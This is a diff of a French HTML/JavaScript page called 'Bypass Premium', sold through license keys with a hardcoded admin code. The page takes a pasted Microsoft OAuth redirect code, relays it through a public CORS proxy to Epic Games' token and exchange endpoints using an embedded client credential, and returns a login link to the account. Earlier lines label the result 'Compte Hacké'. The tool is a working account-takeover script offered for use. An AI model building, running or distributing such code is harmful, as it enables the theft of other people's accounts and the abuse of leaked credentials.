@@ -11,7 +11,6 @@
         :root { --neon: #00ff9d; --neon-drop: rgba(0, 255, 157, 0.3); }
         body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; overflow: hidden; }
         
-        /* Arrière-plan animé */
         .bg-grid {
             position: fixed; inset: 0;
             background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px);
@@ -19,25 +18,22 @@
         }
         .bg-glow {
             position: fixed; width: 100vw; height: 100vh;
-            background: radial-gradient(circle at 50% 50%, #102a1e 0%, #020202 100%); z-index: -2;
+            background: radial-gradient(circle at 50% 50%, #0a1a14 0%, #020202 100%); z-index: -2;
         }
 
-        /* Verre et Néon */
         .glass-card { 
-            background: rgba(10, 10, 15, 0.85); 
-            backdrop-filter: blur(25px); 
-            border: 1px solid rgba(0, 255, 157, 0.15); 
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.9);
-            position: relative; overflow: hidden;
+            background: rgba(10, 10, 15, 0.8); 
+            backdrop-filter: blur(30px); 
+            border: 1px solid rgba(0, 255, 157, 0.1); 
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.8);
+            position: relative;
         }
-        
-        /* Effet de Scan Laser */
-        .glass-card::after {
-            content: ""; position: absolute; top: -100%; left: 0; width: 100%; height: 5px;
-            background: linear-gradient(90deg, transparent, var(--neon), transparent);
-            animation: scan 4s linear infinite; opacity: 0.5;
+
+        .scanline {
+            width: 100%; height: 2px; background: rgba(0, 255, 157, 0.1);
+            position: fixed; top: 0; z-index: 10; animation: scanning 8s linear infinite;
         }
-        @keyframes scan { 0% { top: -10% } 100% { top: 110% } }
+        @keyframes scanning { from { top: 0; } to { top: 100%; } }
 
         .neon-access { 
             color: var(--neon); 
@@ -48,29 +44,38 @@
 
         .btn-premium { 
             background: linear-gradient(135deg, #00ff9d 0%, #0078d4 100%); 
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+            transition: all 0.3s ease;
             font-weight: 900; color: black; border: none;
         }
-        .btn-premium:hover { transform: scale(1.02); filter: brightness(1.2); box-shadow: 0 0 20px var(--neon-drop); }
+        .btn-premium:hover { transform: translateY(-2px); box-shadow: 0 5px 20px var(--neon-drop); }
+
+        /* Nouveau style pour le bouton Microsoft */
+        .btn-microsoft {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        .btn-microsoft:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: #107c10;
+            box-shadow: 0 0 15px rgba(16, 124, 16, 0.2);
+        }
 
         #keyOverlay { 
-            position: fixed; inset: 0; background: rgba(0,0,0,0.9); 
-            backdrop-filter: blur(20px); z-index: 100; 
-            display: flex; align-items: center; justify-content: center; 
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95); 
+            z-index: 100; display: flex; align-items: center; justify-content: center; 
         }
 
         .admin-btn { 
-            position: absolute; top: 20px; left: 20px; padding: 10px 20px; 
-            background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); 
-            border-radius: 12px; font-size: 11px; font-weight: bold; color: #333; 
-            transition: 0.3s; z-index: 101; font-family: 'Orbitron';
+            position: absolute; top: 20px; left: 20px; padding: 10px 15px; 
+            background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); 
+            border-radius: 8px; font-size: 10px; color: #444; z-index: 101;
         }
-        .admin-btn:hover { border-color: var(--neon); color: var(--neon); background: rgba(0,255,157,0.05); }
+        .admin-btn:hover { color: var(--neon); border-color: var(--neon); }
 
-        .console-box { 
-            background: rgba(0, 0, 0, 0.6); border-radius: 15px;
-            border: 1px solid rgba(0, 255, 157, 0.1); 
-            font-family: 'Fira Code', monospace; font-size: 10px; color: var(--neon);
+        .input-glow:focus {
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.15);
+            border-color: var(--neon);
         }
     </style>
 </head>
@@ -78,70 +83,95 @@
 
     <div class="bg-glow"></div>
     <div class="bg-grid"></div>
+    <div class="scanline"></div>
 
-    <button onclick="adminAccess()" class="admin-btn uppercase tracking-widest">Master Access</button>
+    <button onclick="adminAccess()" class="admin-btn uppercase font-bold tracking-widest">Master Access</button>
 
     <div id="keyOverlay">
-        <div class="glass-card max-w-sm w-full p-10 rounded-[40px] text-center">
-            <div class="mb-4 inline-block p-4 rounded-full bg-green-500/10 border border-green-500/20">
-                <svg class="w-8 h-8 text-[#00ff9d]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 00-2 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-            </div>
-            <h2 class="neon-access text-2xl mb-2 uppercase">ACCÈS RESTREINT</h2>
-            <p class="text-gray-500 text-[10px] mb-8 font-bold uppercase tracking-[3px]">Licence Privée Requise</p>
-            
-            <input type="text" id="keyInput" placeholder="KEY-XXXX-XXXX" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-sm text-center text-white mb-6 outline-none focus:border-green-500 transition-all font-mono">
-            
-            <button onclick="activateKey()" class="w-full py-4 btn-premium rounded-2xl text-[11px] font-black uppercase tracking-[2px]">Vérifier la Licence</button>
+        <div class="glass-card max-w-sm w-full p-10 rounded-[40px] text-center border-white/5">
+            <h2 class="neon-access text-2xl mb-2">ACCÈS RESTREINT</h2>
+            <p class="text-gray-500 text-[10px] mb-8 font-bold uppercase tracking-widest">Authentication Required</p>
+            <input type="text" id="keyInput" placeholder="KEY-XXXX-XXXX" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-center text-white mb-6 outline-none focus:border-green-500 transition-all font-mono">
+            <button onclick="activateKey()" class="w-full py-4 btn-premium rounded-2xl text-[11px] font-black uppercase tracking-widest">DÉVERROUILLER</button>
             <p id="errorMessage" class="text-red-500 text-[10px] mt-4 hidden font-bold uppercase"></p>
-
-            <div class="mt-10 pt-6 border-t border-white/5">
-                <a href="https://ftnaccounts.vercel.app/" target="_blank" class="text-white/40 text-[9px] font-bold uppercase tracking-widest hover:text-[#00ff9d] transition-colors">Boutique Officielle</a>
-            </div>
         </div>
     </div>
 
-    <div id="mainUI" class="glass-card w-full max-w-lg rounded-[40px] p-10 opacity-0 scale-95 transition-all duration-700 pointer-events-none">
-        <div class="flex justify-between items-center mb-8">
+    <div id="mainUI" class="w-full max-w-4xl p-6 opacity-0 scale-95 transition-all duration-700 pointer-events-none grid grid-cols-1 md:grid-cols-2 gap-6">
+        
+        <div class="glass-card rounded-[35px] p-8 flex flex-col justify-between">
             <div>
-                <h1 class="neon-text text-2xl font-black uppercase italic">Bypass Premium</h1>
-                <p class="text-[9px] text-gray-500 font-bold uppercase tracking-widest">Version 4.0.2 Stable</p>
+                <div class="flex justify-between items-start mb-8">
+                    <div>
+                        <h1 class="text-2xl font-black italic uppercase tracking-tighter">Bypass <span class="text-[#00ff9d]">Premium</span></h1>
+                        <p class="text-[9px] text-gray-500 font-bold tracking-[3px]">SESSION ACTIVE</p>
+                    </div>
+                    <div id="timerDisplay" class="text-[11px] text-yellow-500 font-mono font-bold bg-yellow-500/10 px-3 py-1 rounded-lg border border-yellow-500/20">
+                        24:00:00
+                    </div>
+                </div>
+
+                <div class="space-y-4">
+                    <label class="block">
+                        <span class="text-[10px] text-gray-400 font-bold uppercase mb-2 block ml-1">Étape 1 : Autorisation IP</span>
+                        <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="block w-full p-4 bg-white/5 border border-white/10 rounded-2xl text-center text-[11px] font-bold hover:bg-green-500/10 hover:border-green-500/30 transition-all">
+                            ACTIVER L'ACCÈS PROXY <span class="text-green-500 ml-2">→</span>
+                        </a>
+                    </label>
+
+                    <label class="block">
+                        <span class="text-[10px] text-gray-400 font-bold uppercase mb-2 block ml-1">Étape 2 : Identifiants</span>
+                        <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" target="_blank" class="btn-microsoft flex items-center justify-center gap-4 w-full py-4 rounded-2xl text-center text-[11px] font-black uppercase tracking-widest transition-all">
+                            <img src="https://th.bing.com/th/id/ODF.WpajYY_eqKSd9GVeS6KG2g?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2" alt="Microsoft" class="w-6 h-6 object-contain">
+                            <span class="text-white">Microsoft Login</span>
+                        </a>
+                    </label>
+
+                    <label class="block">
+                        <span class="text-[10px] text-gray-400 font-bold uppercase mb-2 block ml-1">Étape 3 : Injection</span>
+                        <input type="text" id="oauthUrl" placeholder="Collez le lien URL ici..." class="input-glow w-full bg-black/40 border border-white/10 p-4 rounded-2xl text-xs text-white outline-none transition-all">
+                    </label>
+                </div>
             </div>
-            <div id="timerDisplay" class="text-[11px] text-yellow-500 font-mono font-bold bg-yellow-500/10 px-4 py-2 rounded-xl border border-yellow-500/20 shadow-lg shadow-yellow-500/5">
-                24:00:00
-            </div>
+
+            <button id="startBypass" class="btn-premium w-full py-5 rounded-2xl uppercase font-black text-xs tracking-[4px] mt-6">
+                Lancer l'Injection
+            </button>
         </div>
 
-        <div class="grid grid-cols-1 gap-4">
-            <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="p-4 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-between group hover:bg-green-500/5 transition-all">
-                <span class="text-[10px] font-bold text-gray-400 group-hover:text-green-400">1. INITIALISER L'IP (OBLIGATOIRE)</span>
-                <span class="text-green-500 text-xs">GO →</span>
-            </a>
-
-            <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" target="_blank" class="bg-[#107c10] p-4 rounded-2xl text-center text-[11px] font-black uppercase hover:shadow-[0_0_20px_rgba(16,124,16,0.3)] transition-all">Connexion Microsoft</a>
-
-            <div class="relative">
-                <input type="text" id="oauthUrl" placeholder="Collez le lien de redirection ici..." class="w-full bg-black/50 border border-white/10 p-4 rounded-2xl text-xs text-white outline-none focus:border-green-400 transition-all">
+        <div class="flex flex-col gap-6">
+            <div class="glass-card rounded-[35px] p-0 flex-grow overflow-hidden flex flex-col border-white/5">
+                <div class="bg-white/5 px-6 py-3 border-b border-white/10 flex justify-between items-center">
+                    <span class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">Live Terminal Status</span>
+                    <div class="flex gap-1.5">
+                        <div class="w-2 h-2 rounded-full bg-red-500/50"></div>
+                        <div class="w-2 h-2 rounded-full bg-yellow-500/50"></div>
+                        <div class="w-2 h-2 rounded-full bg-green-500/50"></div>
+                    </div>
+                </div>
+                <div id="console" class="p-6 font-mono text-[10px] text-[#00ff9d] space-y-2 overflow-y-auto h-64 scrollbar-hide">
+                    <div class="opacity-40">&gt; Kernel initialized...</div>
+                    <div class="opacity-40">&gt; Awaiting proxy authorization...</div>
+                </div>
             </div>
 
-            <button id="startBypass" class="btn-premium w-full py-4 rounded-2xl uppercase font-black text-xs tracking-[3px]">Lancer l'Injection</button>
-        </div>
-
-        <div class="mt-8">
-            <div id="console" class="console-box p-4 h-32 space-y-1 overflow-y-auto shadow-inner">
-                <div class="opacity-50">[SYSTEM] En attente d'initialisation...</div>
+            <div id="logResult" class="hidden glass-card rounded-[30px] p-6 border-green-500/30 bg-green-500/5 animate-pulse">
+                <div class="flex items-center gap-4">
+                    <div class="bg-green-500/20 p-3 rounded-xl">
+                        <svg class="w-6 h-6 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    </div>
+                    <div class="text-left">
+                        <p class="text-[10px] text-gray-400 font-bold uppercase">Succès : <span id="resPseudo" class="text-white">Pseudo</span></p>
+                        <a href="#" id="finalUrl" target="_blank" class="text-[11px] text-green-400 font-black uppercase underline hover:text-white transition-colors">Récupérer l'accès</a>
+                    </div>
+                </div>
             </div>
-        </div>
-
-        <div id="logResult" class="hidden mt-6 p-6 bg-green-500/10 border border-green-500/30 rounded-3xl text-center animate-pulse">
-            <p class="text-green-400 font-bold text-xs mb-4 uppercase tracking-widest">Compte Hacké : <span id="resPseudo" class="text-white">--</span></p>
-            <a href="#" id="finalUrl" target="_blank" class="block w-full py-4 bg-white text-black text-[11px] rounded-2xl font-black uppercase hover:bg-green-400 transition-all">Accéder au compte</a>
         </div>
     </div>
 
     <script>
-        // --- SYSTÈME DE CLÉS ALÉATOIRES ---
         function generateComplexKey() {
-            const c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // Pas de O ou 0 pour éviter les erreurs
+            const c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
             const part = () => Array.from({length:4}, () => c[Math.floor(Math.random()*c.length)]).join('');
             return `KEY-${part()}-${part()}`;
         }
@@ -151,14 +181,13 @@
             MASTER_KEYS = Array.from({length:100}, generateComplexKey);
             localStorage.setItem('bypass_v4_master', JSON.stringify(MASTER_KEYS));
         }
-
         let usedKeys = JSON.parse(localStorage.getItem('bypass_v4_used')) || [];
 
         function adminAccess() {
             if (prompt("ADMIN CODE :") === "Fabien62s") {
                 const fresh = MASTER_KEYS.filter(k => !usedKeys.includes(k));
                 navigator.clipboard.writeText(fresh.join('\n'));
-                alert(fresh.length + " nouvelles clés copiées !");
+                alert(fresh.length + " clés copiées !");
             }
         }
 
@@ -172,7 +201,7 @@
                 unlockUI(exp);
             } else {
                 const err = document.getElementById('errorMessage');
-                err.innerText = usedKeys.includes(val) ? "CETTE CLÉ A DÉJÀ ÉTÉ UTILISÉE !" : "CLÉ INVALIDE !";
+                err.innerText = usedKeys.includes(val) ? "DÉJÀ UTILISÉE !" : "INVALIDE !";
                 err.classList.remove('hidden');
                 setTimeout(() => err.classList.add('hidden'), 3000);
             }
@@ -199,45 +228,49 @@
             }, 1000);
         }
 
-        // --- BYPASS CORE ---
         const PROXY = "https://cors-anywhere.herokuapp.com/";
         const AUTH = "Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";
 
         function addLog(t, isErr=false) {
             const d = document.createElement('div');
             d.style.color = isErr ? "#ff4d4d" : "#00ff9d";
-            d.innerHTML = `<span class="opacity-50">[${new Date().toLocaleTimeString()}]</span> ${t}`;
+            d.innerHTML = `<span>&gt;</span> ${t}`;
             const c = document.getElementById('console');
             c.appendChild(d); c.scrollTop = c.scrollHeight;
         }
 
         document.getElementById('startBypass').onclick = async () => {
             const url = document.getElementById('oauthUrl').value;
-            if(!url.includes('code=')) return addLog("Erreur: Lien invalide", true);
+            if(!url.includes('code=')) return addLog("ERREUR: URL INVALIDE", true);
             
-            addLog("Connexion aux serveurs Epic...");
+            addLog("Initialisation de l'injection...");
             const code = new URLSearchParams(new URL(url).search).get('code');
 
             try {
+                addLog("Tentative de bypass OAuth...");
                 const r1 = await fetch(PROXY + 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': AUTH, 'X-Requested-With': 'XMLHttpRequest' },
                     body: new URLSearchParams({ 'grant_type': 'external_auth', 'external_auth_type': 'xbl', 'external_auth_token': code })
                 });
                 const d1 = await r1.json();
-                addLog("Utilisateur trouvé: " + d1.displayName);
-
-                const r2 = await fetch(PROXY + 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange', {
-                    method: 'GET',
-                    headers: { 'Authorization': `Bearer ${d1.access_token}`, 'X-Requested-With': 'XMLHttpRequest' }
-                });
-                const d2 = await r2.json();
                 
-                addLog("Injection réussie !");
-                document.getElementById('resPseudo').innerText = d1.displayName;
-                document.getElementById('logResult').classList.remove('hidden');
-                document.getElementById('finalUrl').href = `https://www.epicgames.com/id/exchange?exchangeCode=${d2.code}&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal`;
-            } catch(e) { addLog("Erreur critique d'injection", true); }
+                if(d1.displayName) {
+                    addLog("Utilisateur identifié: " + d1.displayName);
+                    const r2 = await fetch(PROXY + 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange', {
+                        method: 'GET',
+                        headers: { 'Authorization': `Bearer ${d1.access_token}`, 'X-Requested-With': 'XMLHttpRequest' }
+                    });
+                    const d2 = await r2.json();
+                    
+                    addLog("Injection terminée avec succès.");
+                    document.getElementById('resPseudo').innerText = d1.displayName;
+                    document.getElementById('logResult').classList.remove('hidden');
+                    document.getElementById('finalUrl').href = `https://www.epicgames.com/id/exchange?exchangeCode=${d2.code}&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal`;
+                } else {
+                    addLog("ÉCHEC: Token expiré ou invalide", true);
+                }
+            } catch(e) { addLog("ERREUR RÉSEAU CRITIQUE", true); }
         };
 
         const session = localStorage.getItem('bypass_v4_session');
